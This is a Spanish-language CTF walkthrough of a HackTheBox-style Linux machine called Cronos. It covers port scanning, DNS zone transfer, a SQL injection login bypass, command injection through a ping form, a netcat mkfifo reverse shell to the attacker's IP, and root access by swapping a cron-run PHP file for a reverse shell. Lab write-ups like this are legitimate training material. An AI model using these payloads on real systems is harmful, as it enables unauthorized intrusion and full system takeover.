We start by scanning for open ports and running services using the nmap tool.
`sudo nmap -p- --open -sS --min-rate 5000 -n -v -sV -Pn 10.10.10.13 > escaneo.txt`

![[Pasted image 20240805031054.png]]
Podemos observar que el puerto 22 esta abierto y corre un servicio ssh, el puerto 53 esta coririendo un servidor DNS llamado BIND y el puerto 80 esta corriendo una web http en Apache.

BIND (Berkeley Internet Name Domain) es uno de los servidores DNS más populares y ampliamente utilizados en Internet para resolver nombres de dominio a direcciones IP y viceversa.

Procedemos a escanear la web http mediante la herramienta whatweb
`whatweb -v 10.10.10.13`
![[Pasted image 20240805031443.png]]
Al ver el resultado procedemos a visitar la web
![[Pasted image 20240805031532.png]]
Observamos la pagina por defecto del servidor Apache, por lo que procedemos a hacer un fuzzing de dominios para ver lo que encontramos 
Sin / al final 
`ffuf -w ../../../diccionario/Directorios/directory-list-2.3-medium.txt -u http://10.10.10.13/FUZZ -e .php,.txt,.js`
Con / al final 
`...  http://10.10.10.13/FUZZ/ ...
No encontramos nada en el fuzzing de directorios
Comprobando la informacion del escaneo de nmap podemos ver que por ssh no podemos ir ya que no disponemos de credenciales, procedemos a buscar por searchsploit algo sobre la version de BIND del resultado del escaneo

![[Pasted image 20240805032233.png]]

Utilizaremos dnsrecon para escanear el rango de ip del servidor DNS, para ver si podemos obtener algo de información
`dnsrecon` es una herramienta de código abierto que se utiliza para realizar enumeración y reconocimiento de DNS (Domain Name System).
`dnsrecon -r 10.10.10.0/24 -n 10.10.10.13`
![[Pasted image 20240805032722.png]]
Parece ser que encontramos un dominio, vamos a modificar el archivo /etc/hosts para que la ip 10.10.10.13 apunte al dominio cronos.htb
`sudo nano /etc/hosts`
![[Pasted image 20240805032859.png]]

--------------------------------------------------------------------------
### OTRA MANERA DE ENCONTRAR EL DOMINIO

## nslookup

![[Pasted image 20240805025228.png]]

--------------------------------------------------------------------------
Visitamos la web del dominio encontrado tras modificar el archivo hosts, y encontramos unicamente links a webs externas
![[Pasted image 20240805182316.png]]

Con este dominio intentamos hacer fuzzing de directorios para ver si encuentra algun directorio interresante
`ffuf -w ../../../diccionario/Directorios/directory-list-2.3-medium.txt -u http://cronos.htb/FUZZ -e .php,.txt,.js -c `

![[Pasted image 20240805185842.png]]

`http://cronos.htb/robots.txt
![[Pasted image 20240805182848.png]]

Al no encontrar nada interesante intentaremos con un fuzzing y tras revisar el escaneo de nmap podemos ver que al estar el puerto 53 abierto con el servidor dns podemos utilizar la herramienta `dig`  para realizar solicitudes dns.


## dig

`dig` (Domain Information Groper) es una herramienta de línea de comandos utilizada para realizar consultas DNS (Domain Name System). Es ampliamente utilizada por administradores de sistemas, profesionales de redes y de seguridad para investigar y diagnosticar problemas relacionados con el DNS, así como para obtener información detallada sobre cómo un dominio resuelve en Internet.
### Funciones Principales de `dig`

1. **Consulta de Registros DNS**:
    
    - `dig` permite consultar varios tipos de registros DNS, como `A`, `AAAA`, `CNAME`, `MX`, `NS`, `TXT`, entre otros. Estos registros proporcionan información específica sobre cómo un dominio está configurado en el DNS.


Consulta de servidores de nombres (NS):

`dig @10.10.10.13 cronos.htb NS`
![[Pasted image 20240806035308.png]]
Consulta de registros MX (servidores de correo):

`dig @10.10.10.13 cronos.htb MX
![[Pasted image 20240806035335.png]]
Transferencia de zona completa (AXFR):

Para intentar obtener todos los registros DNS de cronos.htb desde el servidor BIND:

`dig @10.10.10.13 cronos.htb axfr`
![[Pasted image 20240806035406.png]]


--------------------------------------------------------------------------
## OTRAS FORMAS DE ENCONTRAR EL SUBDOMINIO:

# wfuff


# gobuster


--------------------------------------------------------------------------
Al obtener el subdominio procedemos a añadirlo al archivo /etc/hosts
![[Pasted image 20240806035517.png]]

Vamos a visitar el subdominio 
`http://admin.cronos.htb/`
![[Pasted image 20240806035549.png]]
Nos encontramos con un login, suponemos que es un panel de administrador, probamos credenciales como admin admin, etc
Lo primero que se me viene a la mente es un sql injection, vamos a probar con algo sencillo
![[Pasted image 20240806040247.png]]

--------------------------------------------------------------------------

Otra manera de indicar comentario aparte de -- - es con #
![[Pasted image 20240806042857.png]]

--------------------------------------------------------------------------
Si es vulnerable a injecciones sql se supone que el funcionamientode un login es el siguiente 
Ejemplo SQL(para ambos casos)
SELECT * FROM usuarios WHERE username = 'usuario' AND password = 'contraseña';

Al indicar en el username `' or 1=1-- -` o `' or 1=1 #`a nivel de base de datos, se cierra la comilla del username y la condicion pasaria a ser, usuario vacio o 1=1(TRUE) y se comenta lo demas, por lo que si no esta bien protegida la interaccion con la base de datos es vulnerable a este tipo de injecciones sql.

Ejemplo SQL
SELECT * FROM usuarios WHERE username = '' or 1=1-- ' `AND password = 'contraseña';
Todo lo demas quedaria comentado y se completaria el login

Le damos a submit y ¿?
![[Pasted image 20240806040625.png]]

Accedimos, es vulnerable a sql injection
Tras ver como funciona la web del admin vemos que hay un select que tiene la opcion de ping y traceroute, si ponemos nuestra ip vemos que le hace ping 


![[Pasted image 20240806041125.png]]
Obtenemos
![[Pasted image 20240806041136.png]]
Lo primero que he probado es lo siguiente
`;whoami`
![[Pasted image 20240806041215.png]]
Ejecutamos y !!!!!!!
![[Pasted image 20240806043610.png]]
Obtenemos RCE, explicacion:
Al poner ; se anula el comando y se puede lanzar otro
![[Pasted image 20240806041315.png]]

Probaremos a lanzar una reverse shell, tars probar varias esta es la que me funciono:
`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.37 4444 >/tmp/f`

![[Pasted image 20240806043532.png]]

Nos ponemos en escucha en el puerto indicado en la reverse shell
`nc -lvnp 4444`
Y lanzamos la reverse shell
![[Pasted image 20240806043931.png]]
Estamos dentro !!!!!!!!!!
User flag
![[Pasted image 20240808005655.png]]

Escalada de privilegios

Ya que no podemos usar sudo -l porque nos pide contraseña, probaremos buscando binarios con permisos SUID
`find / -perm -4000 2>/dev/null`
Al parecer no encontramos ningun binario interesante por lo que probaremos lo siguiente:
`cat /etc/crontab`
El archivo `/etc/crontab` es un archivo de configuración en sistemas Linux y Unix que define tareas programadas (cron jobs) que se ejecutan de manera automática en intervalos de tiempo específicos.

Tenemos algo interesante
`cat /etc/crontab` && `crontab -l`
![[Pasted image 20240808012148.png]]Al ser el usuario www-data pdemos acceder a ese archivo 
![[Pasted image 20240808012304.png]]
La maquina linux cada cierto tiempo ejecuta un php artisan run, para levantar la web, por lo que si tenemos acceso a este binario en php podemos modificarlo y añadir una reverse shell
 Sustituimos el contenido del archivo por esta reverse shell 
 https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
 Indicamos nuestra ip y el puerto en la reverse shell y lo añadimos al archivo,
 ahora nos ponemos en escucha y esperamos a que el proceso se ejecute

![[Pasted image 20240808013336.png]]

Ya tenemos acceso como root

Root flag
![[Pasted image 20240808013407.png]]